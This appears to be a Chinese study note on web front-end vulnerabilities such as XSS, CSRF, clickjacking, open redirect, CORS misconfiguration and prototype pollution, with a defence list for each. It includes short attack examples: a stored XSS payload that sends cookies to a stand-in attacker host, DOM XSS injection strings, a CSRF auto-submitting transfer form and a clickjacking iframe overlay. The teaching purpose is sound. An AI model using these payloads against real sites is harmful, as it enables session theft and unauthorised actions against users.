# Web 前端常见漏洞与攻击方式

- 日期：2026-11-04
- 所属大纲阶段：第 3 阶段 Web 安全（涉及第 2 阶段漏洞分类）
- 参考资料：OWASP Top 10 (2021)、OWASP Cheat Sheet Series、PortSwigger Web Security Academy（Cross-site scripting / CSRF / Clickjacking 模块）、MDN Web Docs（CSP / Cookie 属性）
- 说明：所有攻击示例均为最小教学演示，仅可在本地靶场（DVWA、PortSwigger Academy、自建虚拟机）中复现。

---

## 总览

| 漏洞 | 核心成因 | 典型危害 | OWASP Top 10 (2021) 映射 |
|---|---|---|---|
| XSS | 不可信数据未编码进入 HTML/JS 执行上下文 | 会话窃取、钓鱼、蠕虫 | A03 Injection |
| CSRF | 请求缺少来源校验，浏览器自动附带 Cookie | 以受害者身份执行操作 | A01 Broken Access Control |
| 点击劫持 | 页面可被恶意站点 iframe 嵌套 | 诱导点击触发敏感操作 | A05 Security Misconfiguration |
| 开放重定向 | 重定向目标取自用户输入 | 钓鱼、OAuth token 窃取 | A01 |
| CORS 配置错误 | 反射任意 Origin + 允许凭证 | 跨站读取敏感数据 | A05 |
| DOM 型漏洞 | 前端 JS 不安全地操作 sink | 同 XSS | A03 |
| 敏感信息泄露 | 前端打包产物/代码含密钥 | API 滥用、横向渗透 | A02 Cryptographic Failures |

---

## 1. 跨站脚本（XSS, Cross-Site Scripting）

### 原理
攻击者注入的 JavaScript 被目标站点当作自己的代码执行。根本原因：**不可信数据从 source 进入 sink 时未做正确的上下文编码**。

### 三种类型

| 类型 | 注入点 | 何时触发 |
|---|---|---|
| 反射型（Reflected） | URL 参数 → 服务端拼进响应 | 受害者点击恶意链接 |
| 存储型（Stored） | 攻击者提交的数据入库 | 任何访问者浏览该页面 |
| DOM 型（DOM-based） | 前端 JS 读取 `location` 等 source 写入 sink | 纯前端，不经过服务端 |

### 攻击方式（示例）

在靶场评论框提交存储型 payload（教学最小示例）：

```html
<script>fetch('http://attacker.example/?c='+document.cookie)</script>
```

DOM 型示例——有漏洞的前端代码：

```js
// 有漏洞：用户输入直接写入 HTML sink
document.getElementById('greeting').innerHTML = '欢迎, ' + new URLSearchParams(location.search).get('name');
```

攻击者构造链接 `?name=<img src=x onerror=alert(document.domain)>`。

常见注入面：HTML 上下文、属性上下文（`value="INPUT"`，用 `" onmouseover=` 逃逸）、JS 字符串上下文（`';alert(1);//'` 逃逸引号）、URL 上下文（`javascript:` 伪协议）。

### 防御
1. **输出编码**：按上下文选择编码器（HTML 实体 / 属性 / JS / URL），框架默认转义（React 的 `{}`、Vue 的 `{{}}` 是安全的，`dangerouslySetInnerHTML` / `v-html` 是高危出口）。
2. **HttpOnly Cookie**：阻止 JS 读取会话 Cookie，限制 XSS 窃取会话的危害（不能阻止 XSS 本身）。
3. **内容安全策略（CSP, Content Security Policy）**：`Content-Security-Policy: script-src 'self'`，禁内联脚本与不可信源；配合 nonce 使用。
4. 输入校验（白名单）作为纵深防御，**不能替代输出编码**。

---

## 2. 跨站请求伪造（CSRF, Cross-Site Request Forgery）

### 原理
浏览器对同一域的请求**自动附带 Cookie**。攻击者的页面可诱导受害者的浏览器向目标站发请求，请求带着受害者的会话凭证，服务端无法区分这是用户本人意愿。

### 攻击方式（示例）

攻击者页面（靶场演示）自动提交表单：

```html
<!-- 受害者已登录 bank.example，访问本页即触发转账请求 -->
<form action="https://bank.example/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.forms[0].submit()</script>
```

GET 型 CSRF 更简单：`<img src="https://bank.example/transfer?to=attacker&amount=5000">`。

### 防御
1. **CSRF Token**：服务端下发随机 token，写操作要求随请求回传并校验（Same-Origin 下攻击者拿不到）。
2. **SameSite Cookie**：`Set-Cookie: sid=xxx; SameSite=Lax|Strict`（现代浏览器默认 Lax，拦掉了大部分跨站 POST）。
3. 校验 `Origin` / `Referer` 头。
4. 敏感操作二次验证（密码/验证码）。
5. 不要用 GET 执行写操作。

> 关键区分：XSS 是「执行攻击者的代码」，CSRF 是「借用受害者的身份发请求」。XSS 可以绕过 CSRF Token（脚本能读 DOM 里的 token），所以 XSS 修复优先级更高。

---

## 3. 点击劫持（Clickjacking / UI Redressing）

### 原理
恶意站点用透明 `<iframe>` 覆盖在诱导内容之上，受害者以为在点「领取奖品」，实际点击的是被嵌套的目标站按钮（如「删除账户」「授权」）。变体：拖放劫持、光标劫持。

### 攻击方式（示例）

```html
<style>
  iframe { position:absolute; opacity:0.01; z-index:2; width:500px; height:200px; }
</style>
<!-- 诱导层 -->
<button style="position:absolute;top:90px;left:120px;z-index:1">点击领奖</button>
<iframe src="https://target.example/account/delete"></iframe>
```

### 防御
1. `X-Frame-Options: DENY`（或 `SAMEORIGIN`）。
2. CSP：`Content-Security-Policy: frame-ancestors 'none'`（现代替代方案）。
3. 敏感操作页面加 JavaScript frame-busting 作为兜底。
4. 新方向：组件级防御如 `Content-Security-Policy: sandbox`。

---

## 4. 开放重定向（Open Redirect）

### 原理
`GET /redirect?url=<用户输入>` 之类的端点未校验跳转目标，302 到任意地址。本身危害有限，但常作为链路一环：

- 钓鱼：`https://trusted.example/redirect?url=//evil.example`，URL 前缀是可信域名，迷惑性强。
- OAuth 回调劫持：若 OAuth 授权码流程的 `redirect_uri` 校验不严，授权码被发到攻击者控制的地址。

### 防御
1. 重定向白名单（精确匹配 host）。
2. 不接受绝对 URL 参数，只允许路由名或相对路径。
3. OAuth `redirect_uri` 做严格全等校验。

---

## 5. 跨源资源共享配置错误（CORS Misconfiguration）

### 原理
CORS 是浏览器机制：服务端用 `Access-Control-Allow-Origin` 声明哪些源可以跨域读响应。配置错误会把数据暴露给恶意源。

典型错误配置：

```
# 反射任意 Origin 且允许带凭证 —— 等于对任意站点开放读权限
Access-Control-Allow-Origin: https://evil.example   (从请求头反射)
Access-Control-Allow-Credentials: true
```

其他坑：`Origin: null` 被放行（沙箱 iframe / data URL 都发 null）；子域通配 `*.example.com`（子域被 XSS 即可跨界读取）；前缀匹配 `startswith("https://example.com")`（放行 `https://example.com.evil.io`）。

### 防御
1. ACAO 白名单精确匹配，不反射请求头。
2. 带凭证时 ACAO 必须是单个具体源，永远不能是 `*`。
3. 不放行 `null`。
4. 默认不同源放行，按需开放。

---

## 6. DOM 相关漏洞

### 6.1 DOM XSS 的常见 source → sink

| Source（输入） | Sink（危险出口） |
|---|---|
| `location.hash` / `location.search` | `innerHTML` / `outerHTML` |
| `document.referrer` | `document.write` |
| `postMessage` data | `eval` / `setTimeout("str")` / `Function()` |
| `window.name` | `element.setAttribute('href', ...)` |
| `localStorage` / `sessionStorage` | jQuery `$()` 选择器注入 |

### 6.2 postMessage 漏洞
接收方不校验 `event.origin` 就信任消息：

```js
// 有漏洞
window.addEventListener('message', e => {
  document.getElementById('out').innerHTML = e.data;  // 任意源可发
});
```

防御：接收方校验 `event.origin`，发送方 `targetOrigin` 不用 `*`（发敏感数据时）。

### 6.3 原型污染（Prototype Pollution）
常见于对不可信 JSON 做递归合并的库：`__proto__.isAdmin=true` 污染 `Object.prototype`，可能升级为 XSS/权限绕过。防御：合并时黑名单 `__proto__`/`constructor`/`prototype` 键；用 `Object.create(null)`；依赖及时升级（历史案例：lodash、jQuery extend）。

---

## 7. 前端敏感信息泄露

- **打包产物含密钥**：`VITE_`/`NEXT_PUBLIC_` 前缀变量、SDK key 直接进 bundle。任何「前端放密钥」都视为公开——需要走后端代理转发。
- **Sourcemap 上线未关闭**：`.map` 文件暴露完整源码与注释。
- **API 响应过度返回**：前端不需要的字段（密码哈希、内部 ID）也下发，抓包即见。
- **localStorage 存 JWT/会话 token**：任何 XSS 直接读取（对比 HttpOnly Cookie）。若必须存，考虑加内存 + 刷新机制的取舍。
- **注释与隐藏路由**：构建产物中的内网地址、调试接口、feature flag。

防御：CI 中加 secret 扫描（gitleaks/trufflehog）、关闭生产 sourcemap、API 响应字段最小化（DTO 裁剪）。

---

## 8. 面向浏览器的其他攻击（了解）

- **Session Fixation**：登录前后不更换会话 ID，攻击者预置会话。
- **Tabnabbing**：`target="_blank"` 不加 `rel="noopener"` 时，新页面可通过 `window.opener` 反向钓鱼（现代浏览器已默认隔离，老代码仍有风险）。
- **Cache Deception**：路径加 `/.css` 等技巧让缓存层存储个性化页面的副本。
- **Web Cache Poisoning**：注入反映在响应中且被缓存的头（如 `X-Forwarded-Host`），污染共享缓存。

---

## 复习自查

- [ ] 能画出反射型 / 存储型 / DOM 型 XSS 的数据流路径
- [ ] 能解释 SameSite=Lax 为什么挡住了大多数 CSRF 但不挡顶级导航 GET
- [ ] 能说出 CSP 里 `script-src 'self'` 与 nonce 模式的区别
- [ ] 能指出 `innerHTML`、`eval`、`v-html`、`dangerouslySetInnerHTML` 各自的风险场景
- [ ] 能列出 CORS 三种典型错误配置及利用条件

## 延伸实验（labs 计划）

1. DVWA：XSS (Reflected/Stored/DOM) 三模块，Low→High 逐级对照代码差异。
2. PortSwigger Academy：CSRF 实验（绕过 token 校验、SameSite 相关新实验）。
3. 自建 demo：Express + 无校验 CORS 中间件 → 恶意页读取数据，再修复。

---

## 深入阅读（详解系列）

- [03-XSS跨站脚本详解](03-XSS跨站脚本详解.md) —— 上下文逃逸、CSP 绕过、利用阶段
- [04-CSRF跨站请求伪造详解](04-CSRF跨站请求伪造详解.md) —— SameSite 机制、token 绕过面、登录 CSRF
- [05-同源策略与CORS详解](05-同源策略与CORS详解.md) —— SOP 边界、预检流程、错配利用、COOP/CORP
